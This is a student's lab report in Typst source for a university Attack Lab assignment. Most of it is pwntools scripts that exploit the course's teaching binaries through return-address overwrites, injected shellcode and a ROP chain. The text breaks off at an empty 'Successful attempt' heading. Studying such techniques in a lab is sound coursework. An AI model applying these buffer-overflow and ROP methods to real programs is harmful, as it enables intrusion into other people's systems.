#let title = [CSED211: Attack Lab Report]

#set page(
  paper: "a4",
  header: align(right + horizon, title),
  numbering: "- 1 / 1 -",
)
#set par(justify: true)
#set text(
  font: "IBM Plex Serif",
  size: 11pt,
  hyphenate: false,
)
#set heading(numbering: "I a. ")
#show raw: set text(font: "IBM Plex Mono")

#align(center, text(size: 24pt, weight: "bold",
  title
))
#align(right, text(style: "italic")[
  2024-10-23/2024-11-06 \
  20230262 / Yeonung Kim \
  yeonung04\@postech.ac.kr \
])
#rect(width: 100%, align(center)[
  #block(text(size: 13pt, weight: "bold")[
    명예서약 Honour Code
  ])
  나는 이 프로그래밍 과제를 다른 소스를 인용없이 참고하거나, \
  다른 사람의 부적절한 도움을 받지 않고 완수하였습니다. \
  I hereby pledge on my honour that I have not given or received \
  any unauthorised assistance on this assignment. \
])

= `c1.py`

```python
#!/usr/bin/env python3

from pwn import *
from sys import argv

proc = process(["ctarget", *argv])
elf = ELF("ctarget")
cookie = int(open("cookie.txt").read(), 16)
buffer_size = 0x18

exploit = b"\x90" * buffer_size + p64(elf.symbols["touch1"])
open("c1.in", "wb").write(exploit)

proc.sendline(exploit)
proc.interactive()
```

= `c2.py`

```python
#!/usr/bin/env python3

from pwn import *
from sys import argv

proc = process(["ctarget", *argv])
elf = ELF("ctarget")
cookie = int(open("cookie.txt").read(), 16)
buffer_addr = 0x55617488
buffer_size = 0x18

shellcode = asm(f"mov edi, {cookie}; ret")
# Sneaky RET ROPgadget to satisfy 128-bit alignment for movaps in sprintf
exploit = shellcode + b"\x90" * (buffer_size - len(shellcode)) \
    + p64(buffer_addr) \
    + p64(buffer_addr + len(shellcode) - 1) \
    + p64(elf.symbols["touch2"])
open("c2.in", "wb").write(exploit)

proc.sendline(exploit)
proc.interactive()
```

= `c3.py`

```python
#!/usr/bin/env python3

from pwn import *
from sys import argv

proc = process(["ctarget", *argv])
elf = ELF("ctarget")
cookie = int(open("cookie.txt").read(), 16)
buffer_addr = 0x55617488
buffer_size = 0x18

sval = hex(cookie)[2:].encode("utf-8") + b"\0"
shellcode = asm(f"mov edi, {buffer_addr + buffer_size + 0x8 * 3}; ret")
# Sneaky RET ROPgadget to satisfy 128-bit alignment for movaps in sprintf
exploit = shellcode + b"\x90" * (buffer_size - len(shellcode)) \
    + p64(buffer_addr) \
    + p64(buffer_addr + len(shellcode) - 1) \
    + p64(elf.symbols["touch3"]) \
    + sval
open("c3.in", "wb").write(exploit)

proc.sendline(exploit)
proc.interactive()
```

= `r1.py`

== Initial attempt (marked invalid)

```python
#!/usr/bin/env python3

from pwn import *
from sys import argv

proc = process(["rtarget", *argv])
elf = ELF("rtarget")
rop = ROP("rtarget")
cookie = int(open("cookie.txt").read(), 16)
buffer_size = 0x18

exploit = b"\x90" * buffer_size \
    + p64(rop.rdi.address) \
    + p64(cookie) \
    + p64(rop.ret.address) \
    + p64(elf.symbols["touch2"])
open("r1.in", "wb").write(exploit)

proc.sendline(exploit)
proc.interactive()
```

== Successful attempt

